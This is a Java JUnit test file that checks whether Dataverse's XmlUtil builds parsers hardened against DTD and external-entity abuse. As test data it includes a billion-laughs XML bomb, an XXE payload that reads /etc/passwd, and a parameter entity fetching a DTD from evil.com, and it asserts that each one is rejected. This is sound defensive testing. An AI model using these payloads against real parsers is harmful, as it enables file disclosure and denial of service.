package edu.harvard.iq.dataverse.util.xml;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.StringReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamConstants;
import javax.xml.stream.XMLStreamException;
import javax.xml.stream.XMLStreamReader;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathFactory;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.xml.sax.Attributes;
import org.xml.sax.InputSource;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.DefaultHandler;

public class XmlUtilTest {
    String xml = """
                <test>
                <one>
                    <two>Hello</two>
                </one>
            </test>""";

    @Test
    void testRetrieveCurrentAsString() throws Exception {
        // Create a secure XMLReader using XmlUtil
        XMLReader xmlReader = XmlUtil.getSecureXMLReader();

        // Create a handler to capture the parsed content
        final StringBuilder parsedContent = new StringBuilder();
        final boolean[] foundElement = new boolean[1];

        xmlReader.setContentHandler(new DefaultHandler() {
            private boolean insideTwo = false;

            @Override
            public void startElement(String uri, String localName, String qName, Attributes attributes) {
                if ("two".equals(localName) || "two".equals(qName)) {
                    insideTwo = true;
                    foundElement[0] = true;
                }
            }

            @Override
            public void characters(char[] ch, int start, int length) {
                if (insideTwo) {
                    parsedContent.append(ch, start, length);
                }
            }

            @Override
            public void endElement(String uri, String localName, String qName) {
                if ("two".equals(localName) || "two".equals(qName)) {
                    insideTwo = false;
                }
            }
        });

        // Reset the input stream since we're reusing it
        InputStream freshInputStream = new ByteArrayInputStream(xml.getBytes());

        // Parse the XML
        xmlReader.parse(new InputSource(freshInputStream));

        // Verify the content was parsed correctly
        assertTrue(foundElement[0], "The 'two' element should be found");
        assertEquals("Hello", parsedContent.toString().trim(), "The content of the 'two' element should be 'Hello'");

        // If you want to use XPath to verify the structure, you can use DocumentBuilder instead
        DocumentBuilder db = XmlUtil.getSecureDocumentBuilder();
        org.w3c.dom.Document doc = db.parse(new InputSource(new ByteArrayInputStream(xml.getBytes())));

        // Use XPath to verify the structure
        XPathFactory xpf = XPathFactory.newInstance();
        XPath xpath = xpf.newXPath();
        String result = xpath.evaluate("/test/one/two", doc);

        assertEquals("Hello", result, "XPath should find the content of the 'two' element");
    }

    @Test
    void testSecurityConfiguration_EntityReferencesHandledSecurely() throws Exception {
        // Test that XML with entity references is handled securely
        
        // First, test with predefined entities which should work fine
        String xmlWithPredefinedEntities = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<root>"
                + "  <predefined>This text has &lt;brackets&gt; and an &amp;ampersand;</predefined>"
                + "</root>";

        InputStream xmlStream = new ByteArrayInputStream(xmlWithPredefinedEntities.getBytes(StandardCharsets.UTF_8));
        
        // Create a secure XMLReader using XmlUtil
        XMLReader xmlReader = XmlUtil.getSecureXMLReader();
        
        // Create a handler to capture the parsed content
        final StringBuilder predefinedContent = new StringBuilder();
        final boolean[] inPredefined = new boolean[1];

        xmlReader.setContentHandler(new DefaultHandler() {
            @Override
            public void startElement(String uri, String localName, String qName, Attributes attributes) {
                String name = localName.isEmpty() ? qName : localName;
                if ("predefined".equals(name)) {
                    inPredefined[0] = true;
                }
            }

            @Override
            public void characters(char[] ch, int start, int length) {
                String content = new String(ch, start, length);
                if (inPredefined[0]) {
                    predefinedContent.append(content);
                }
            }

            @Override
            public void endElement(String uri, String localName, String qName) {
                String name = localName.isEmpty() ? qName : localName;
                if ("predefined".equals(name)) {
                    inPredefined[0] = false;
                }
            }
        });

        // Parse the XML with predefined entities - should not throw an exception
        assertDoesNotThrow(() -> xmlReader.parse(new InputSource(xmlStream)));
        
        // Verify predefined entities were properly decoded
        assertEquals("This text has <brackets> and an &ampersand;", 
                predefinedContent.toString().trim(), 
                "Predefined XML entities should be properly decoded");
        
        // Now test with custom entity which should cause an exception
        String xmlWithCustomEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<root>"
                + "  <custom>&customEntity;</custom>"
                + "</root>";
                
        InputStream dbStream = new ByteArrayInputStream(xmlWithCustomEntity.getBytes(StandardCharsets.UTF_8));
        
        // The parser should throw an exception for undeclared entities
        // This is the expected secure behavior
        Exception exception = assertThrows(org.xml.sax.SAXParseException.class, 
                () -> xmlReader.parse(new InputSource(dbStream)));
        
        // Verify the exception message mentions the undeclared entity
        assertTrue(exception.getMessage().contains("customEntity"), 
                "Exception should mention the undeclared entity");
        
        // Also test with DocumentBuilder for completeness
        DocumentBuilder db = XmlUtil.getSecureDocumentBuilder();
        
        // Test with predefined entities
        org.w3c.dom.Document doc = db.parse(new InputSource(new ByteArrayInputStream(
                xmlWithPredefinedEntities.getBytes(StandardCharsets.UTF_8))));
        
        // Check that the elements exist with properly handled entities
        org.w3c.dom.NodeList predefinedNodes = doc.getElementsByTagName("predefined");
        assertEquals(1, predefinedNodes.getLength(), "Predefined element should exist");
        
        String predefinedText = predefinedNodes.item(0).getTextContent();
        assertEquals("This text has <brackets> and an &ampersand;", 
                predefinedText, 
                "Predefined XML entities should be properly decoded");
        
        // Test with custom entity - should throw exception
        Exception dbException = assertThrows(org.xml.sax.SAXParseException.class, 
                () -> db.parse(new InputSource(new ByteArrayInputStream(
                        xmlWithCustomEntity.getBytes(StandardCharsets.UTF_8)))));
        
        assertTrue(dbException.getMessage().contains("customEntity"), 
                "Exception should mention the undeclared entity");
    }

    @Test
    void testSecurityConfiguration_DTDProcessingDisabled() throws Exception {
        // Test that DTD features are properly disabled
        // Instead of using DOCTYPE declarations (which might be rejected entirely),
        // we'll verify the security features are properly configured
        
        // Create a secure XMLReader using XmlUtil
        XMLReader xmlReader = XmlUtil.getSecureXMLReader();
        
        // Verify that DTD-related features are properly disabled
        assertTrue(xmlReader.getFeature("http://apache.org/xml/features/disallow-doctype-decl"), 
                "DOCTYPE declarations should be disallowed");
        assertFalse(xmlReader.getFeature("http://xml.org/sax/features/external-general-entities"), 
                "External general entities should be disabled");
        assertFalse(xmlReader.getFeature("http://xml.org/sax/features/external-parameter-entities"), 
                "External parameter entities should be disabled");
        
        // Test with a simple XML without DOCTYPE to ensure basic parsing still works
        String simpleXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>Simple content</root>";
        InputStream stream = new ByteArrayInputStream(simpleXml.getBytes(StandardCharsets.UTF_8));
        
        // Create a handler to capture the parsed content
        final StringBuilder parsedContent = new StringBuilder();
        final boolean[] rootElementFound = new boolean[1];
        
        xmlReader.setContentHandler(new DefaultHandler() {
            private boolean insideRoot = false;
            
            @Override
            public void startElement(String uri, String localName, String qName, Attributes attributes) {
                if ("root".equals(localName) || "root".equals(qName)) {
                    insideRoot = true;
                    rootElementFound[0] = true;
                }
            }
            
            @Override
            public void characters(char[] ch, int start, int length) {
                if (insideRoot) {
                    parsedContent.append(ch, start, length);
                }
            }
            
            @Override
            public void endElement(String uri, String localName, String qName) {
                if ("root".equals(localName) || "root".equals(qName)) {
                    insideRoot = false;
                }
            }
        });
        
        // Parse the XML - should not throw an exception
        assertDoesNotThrow(() -> xmlReader.parse(new InputSource(stream)));
        
        // Verify the root element was found and content was parsed correctly
        assertTrue(rootElementFound[0], "Root element should be found");
        assertEquals("Simple content", parsedContent.toString().trim(), 
                "Content should be parsed correctly");
        
        // Also test with DocumentBuilder for completeness
        DocumentBuilder db = XmlUtil.getSecureDocumentBuilder();
        
        // Verify that DTD-related features are properly disabled in DocumentBuilderFactory
        DocumentBuilderFactory dbf = XmlUtil.getSecureDocumentBuilderFactory();
        
        assertTrue(dbf.getFeature("http://apache.org/xml/features/disallow-doctype-decl"), 
                "DOCTYPE declarations should be disallowed in DocumentBuilderFactory");
        assertFalse(dbf.getFeature("http://xml.org/sax/features/external-general-entities"), 
                "External general entities should be disabled in DocumentBuilderFactory");
        assertFalse(dbf.getFeature("http://xml.org/sax/features/external-parameter-entities"), 
                "External parameter entities should be disabled in DocumentBuilderFactory");
        
        // Parse a simple XML to ensure basic functionality works
        org.w3c.dom.Document doc = db.parse(new InputSource(new ByteArrayInputStream(
                simpleXml.getBytes(StandardCharsets.UTF_8))));
        
        // Check that the root element exists with correct content
        org.w3c.dom.NodeList rootNodes = doc.getElementsByTagName("root");
        assertEquals(1, rootNodes.getLength(), "Root element should exist");
        assertEquals("Simple content", rootNodes.item(0).getTextContent(), 
                "Root element should have correct content");
    }

    @Test
    void testSecurityConfiguration_EntityReferencesNotReplaced() throws Exception {
        // Test that predefined entity references are handled safely
        // Using predefined XML entities that don't require DOCTYPE declarations
        String xmlWithPredefinedEntities = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<root>This text has &lt;brackets&gt; and an &amp;ampersand;</root>";

        InputStream stream = new ByteArrayInputStream(xmlWithPredefinedEntities.getBytes(StandardCharsets.UTF_8));

        // Create a secure XMLReader using XmlUtil
        XMLReader xmlReader = XmlUtil.getSecureXMLReader();

        // Create a handler to capture the parsed content
        final StringBuilder parsedContent = new StringBuilder();
        final boolean[] rootElementFound = new boolean[1];

        xmlReader.setContentHandler(new DefaultHandler() {
            private boolean insideRoot = false;

            @Override
            public void startElement(String uri, String localName, String qName, Attributes attributes) {
                if ("root".equals(localName) || "root".equals(qName)) {
                    insideRoot = true;
                    rootElementFound[0] = true;
                }
            }

            @Override
            public void characters(char[] ch, int start, int length) {
                if (insideRoot) {
                    parsedContent.append(ch, start, length);
                }
            }

            @Override
            public void endElement(String uri, String localName, String qName) {
                if ("root".equals(localName) || "root".equals(qName)) {
                    insideRoot = false;
                }
            }
        });

        // Parse the XML - should not throw an exception
        assertDoesNotThrow(() -> xmlReader.parse(new InputSource(stream)));

        // Verify the root element was found
        assertTrue(rootElementFound[0], "Root element should be found");
        
        // Verify the predefined entities were properly handled
        // The parser should convert &lt; to < and &amp; to & as these are built-in XML entities
        assertEquals("This text has <brackets> and an &ampersand;", parsedContent.toString().trim(), 
                "Predefined XML entities should be properly decoded");

        // Also test with DocumentBuilder for completeness
        assertDoesNotThrow(() -> {
            DocumentBuilder db = XmlUtil.getSecureDocumentBuilder();
            org.w3c.dom.Document doc = db.parse(new InputSource(new ByteArrayInputStream(
                    xmlWithPredefinedEntities.getBytes(StandardCharsets.UTF_8))));

            // Check that the root element exists with properly decoded entities
            org.w3c.dom.NodeList rootNodes = doc.getElementsByTagName("root");
            assertEquals(1, rootNodes.getLength(), "Root element should exist");

            String rootContent = rootNodes.item(0).getTextContent();
            assertEquals("This text has <brackets> and an &ampersand;", rootContent, 
                    "Predefined XML entities should be properly decoded");
        });
    }

    @ParameterizedTest
    @ValueSource(strings = {
            // XML Bomb (Billion laughs attack)
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE lolz [<!ENTITY lol"
                    + " \"lol\"><!ENTITY lol2"
                    + " \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3"
                    + " \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">"
                    + "]><lolz>&lol3;</lolz>",
            // External entity attack
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    + "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                    + "<root>&xxe;</root>",
            // Parameter entity attack
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM"
                    + " \"http://evil.com/evil.dtd\">%xxe;]><root>test</root>"
    })
    void testSecurityConfiguration_MaliciousXMLHandledSafely(String maliciousXml) throws Exception {
        // Create a secure XMLReader using XmlUtil
        XMLReader xmlReader = XmlUtil.getSecureXMLReader();

        // Since DOCTYPE declarations are disallowed, parsing should throw an exception
        InputStream xmlStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));
        Exception exception = assertThrows(org.xml.sax.SAXParseException.class, 
                () -> xmlReader.parse(new InputSource(xmlStream)));
        
        // Verify the exception message mentions DOCTYPE
        assertTrue(exception.getMessage().contains("DOCTYPE") || 
                   exception.getMessage().contains("doctype"),
                   "Exception should mention DOCTYPE being disallowed");

        // Also test with DocumentBuilder for completeness
        DocumentBuilder db = XmlUtil.getSecureDocumentBuilder();
        
        // Create a new stream for the DocumentBuilder test
        InputStream dbStream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));
        
        // DocumentBuilder should also throw an exception
        Exception dbException = assertThrows(org.xml.sax.SAXParseException.class, 
                () -> db.parse(new InputSource(dbStream)));
        
        // Verify the exception message mentions DOCTYPE
        assertTrue(dbException.getMessage().contains("DOCTYPE") || 
                   dbException.getMessage().contains("doctype"),
                   "Exception should mention DOCTYPE being disallowed");
    }

    @Test
    void testSecurityConfiguration_NormalXMLStillWorks() throws Exception {
        // Test that normal XML processing still works correctly
        String normalXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><books><book id=\"1\"><title>Test"
                + " Book</title><author>Test Author</author></book></books>";

        InputStream stream = new ByteArrayInputStream(normalXml.getBytes(StandardCharsets.UTF_8));

        // Create a secure XMLReader using XmlUtil
        XMLReader xmlReader = XmlUtil.getSecureXMLReader();

        // Create a handler to capture the parsed content and structure
        final List<String> elementNames = new ArrayList<>();
        final String[] bookIdValue = new String[1];
        final StringBuilder titleContent = new StringBuilder();
        final StringBuilder authorContent = new StringBuilder();
        final boolean[] insideTitle = new boolean[1];
        final boolean[] insideAuthor = new boolean[1];

        xmlReader.setContentHandler(new DefaultHandler() {
            @Override
            public void startElement(String uri, String localName, String qName, Attributes attributes) {
                String elementName = localName.isEmpty() ? qName : localName;
                elementNames.add(elementName);
                
                if ("book".equals(elementName)) {
                    bookIdValue[0] = attributes.getValue("id");
                } else if ("title".equals(elementName)) {
                    insideTitle[0] = true;
                } else if ("author".equals(elementName)) {
                    insideAuthor[0] = true;
                }
            }

            @Override
            public void characters(char[] ch, int start, int length) {
                String content = new String(ch, start, length);
                if (insideTitle[0]) {
                    titleContent.append(content);
                } else if (insideAuthor[0]) {
                    authorContent.append(content);
                }
            }

            @Override
            public void endElement(String uri, String localName, String qName) {
                String elementName = localName.isEmpty() ? qName : localName;
                if ("title".equals(elementName)) {
                    insideTitle[0] = false;
                } else if ("author".equals(elementName)) {
                    insideAuthor[0] = false;
                }
            }
        });

        // Parse the XML
        xmlReader.parse(new InputSource(stream));

        // Verify the structure was parsed correctly
        assertEquals(4, elementNames.size(), "Should have found 4 elements");
        assertEquals("books", elementNames.get(0), "First element should be 'books'");
        assertEquals("book", elementNames.get(1), "Second element should be 'book'");
        assertEquals("title", elementNames.get(2), "Third element should be 'title'");
        assertEquals("author", elementNames.get(3), "Fourth element should be 'author'");
        
        // Verify attribute was parsed correctly
        assertEquals("1", bookIdValue[0], "Book ID should be '1'");
        
        // Verify content was parsed correctly
        assertEquals("Test Book", titleContent.toString().trim(), "Title content should be 'Test Book'");
        assertEquals("Test Author", authorContent.toString().trim(), "Author content should be 'Test Author'");

        // Also test with DocumentBuilder for completeness
        DocumentBuilder db = XmlUtil.getSecureDocumentBuilder();
        org.w3c.dom.Document doc = db.parse(new InputSource(new ByteArrayInputStream(
                normalXml.getBytes(StandardCharsets.UTF_8))));

        // Use XPath to verify the structure
        XPathFactory xpf = XPathFactory.newInstance();
        XPath xpath = xpf.newXPath();
        
        // Verify element structure
        assertEquals("books", doc.getDocumentElement().getNodeName(), "Root element should be 'books'");
        assertEquals("1", xpath.evaluate("/books/book/@id", doc), "Book ID should be '1'");
        assertEquals("Test Book", xpath.evaluate("/books/book/title", doc), "Title should be 'Test Book'");
        assertEquals("Test Author", xpath.evaluate("/books/book/author", doc), "Author should be 'Test Author'");
    }
    
    @Test
    void testSecureXMLInputFactory() throws Exception {
        // Test that XMLInputFactory is properly secured and works correctly
        
        // Get the secure XMLInputFactory
        XMLInputFactory xmlInputFactory = XmlUtil.getSecureXMLInputFactory();
        
        // Verify security settings
        assertFalse((Boolean) xmlInputFactory.getProperty(XMLInputFactory.SUPPORT_DTD), 
                "DTD support should be disabled");
        assertFalse((Boolean) xmlInputFactory.getProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES), 
                "External entity support should be disabled");
        assertTrue((Boolean) xmlInputFactory.getProperty(XMLInputFactory.IS_COALESCING), 
                "Coalescing should be enabled");
        
        // Test with normal XML
        String normalXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><element>Test content</element></root>";
        XMLStreamReader reader = xmlInputFactory.createXMLStreamReader(new StringReader(normalXml));
        
        // Parse and verify content
        StringBuilder content = new StringBuilder();
        String elementName = null;
        
        while (reader.hasNext()) {
            int event = reader.next();
            
            switch (event) {
                case XMLStreamConstants.START_ELEMENT:
                    elementName = reader.getLocalName();
                    break;
                case XMLStreamConstants.CHARACTERS:
                    if ("element".equals(elementName)) {
                        content.append(reader.getText());
                    }
                    break;
            }
        }
        
        assertEquals("Test content", content.toString(), "Content should be parsed correctly");
        
        // Test with XML containing entity references
        String xmlWithEntities = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><element>Test &lt;content&gt;</element></root>";
        reader = xmlInputFactory.createXMLStreamReader(new StringReader(xmlWithEntities));
        
        // Parse and verify content
        content = new StringBuilder();
        elementName = null;
        
        while (reader.hasNext()) {
            int event = reader.next();
            
            switch (event) {
                case XMLStreamConstants.START_ELEMENT:
                    elementName = reader.getLocalName();
                    break;
                case XMLStreamConstants.CHARACTERS:
                    if ("element".equals(elementName)) {
                        content.append(reader.getText());
                    }
                    break;
            }
        }
        
        assertEquals("Test <content>", content.toString(), "Entities should be properly decoded");
        
        // Test with malicious XML (should throw exception)
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>";

        XMLStreamException exception = assertThrows(XMLStreamException.class, () -> {
            XMLStreamReader maliciousReader = xmlInputFactory.createXMLStreamReader(new StringReader(maliciousXml));
            // Read through the document
            while (maliciousReader.hasNext()) {
                maliciousReader.next();
            }
        });
        
     // The exception message might vary by implementation, but should indicate a problem with DOCTYPE or entities
        assertTrue(exception.getMessage().contains("DOCTYPE") || 
                   exception.getMessage().contains("doctype") ||
                   exception.getMessage().contains("entity") ||
                   exception.getMessage().contains("DTD"),
                   "Exception should indicate a security-related issue");
    }

}
